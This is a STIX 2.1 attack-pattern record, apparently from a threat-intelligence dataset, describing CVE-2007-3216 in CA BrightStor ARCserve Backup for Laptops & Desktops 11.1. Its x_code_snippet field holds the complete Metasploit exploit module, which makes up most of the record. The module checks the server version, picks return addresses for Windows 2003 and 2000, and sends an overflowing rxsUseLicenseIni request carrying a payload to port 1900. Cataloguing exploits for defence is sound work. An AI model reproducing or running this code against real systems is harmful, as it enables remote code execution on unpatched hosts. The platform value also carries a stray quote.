{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08460264-8b9e-45f9-b264-94dbf264d262",
    "created": "2024-08-14T16:48:10.364662Z",
    "modified": "2024-08-14T16:48:10.364666Z",
    "name": "CA BrightStor ARCserve for Laptops and Desktops LGServer Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup for Laptops & Desktops 11.1. By sending a specially crafted request (rxsUseLicenseIni), an attacker could overflow the buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/lgserver_rxsuselicenseini.rb",
            "external_id": "lgserver_rxsuselicenseini.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3216"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor ARCserve for Laptops and Desktops LGServer Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup\n        for Laptops & Desktops 11.1. By sending a specially crafted request (rxsUseLicenseIni), an\n        attacker could overflow the buffer and execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-3216' ],\n          [ 'OSVDB', '35329' ],\n          [ 'BID', '24348' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 700,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Windows 2003 SP0 English',\t{ 'Ret' => 0x71ae1f9b } ],\n          [ 'Windows 2000 SP4 English',\t{ 'Ret' => 0x75031dce } ],\n        ],\n      'DisclosureDate' => '2007-06-06',\n      'DefaultTarget' => 0))\n\n    register_options([ Opt::RPORT(1900) ])\n  end\n\n  def check\n    connect\n\n    sock.put(\"0000000019rxrGetServerVersion\")\n    ver = sock.get_once\n\n    disconnect\n\n    if ( ver and ver =~ /11\\.1\\.742/ )\n        return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    data  = rand_text_alpha_upper(4108) + [target.ret].pack('V')\n    data << payload.encoded + rand_text_alpha_upper(rand(300) + 1)\n\n    sploit  = \"0000004820\"         # Command Length Field\n    sploit << \"rxsUseLicenseIni\"   # RPC Command\n    sploit << \"~~\"                 # Constant Argument Delimiter\n    sploit << data\n\n    print_status(\"Trying target #{target.name}...\")\n    # One-shot overwrite...\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-06-06",
    "x_mitre_platforms": [
        "win'"
    ]
}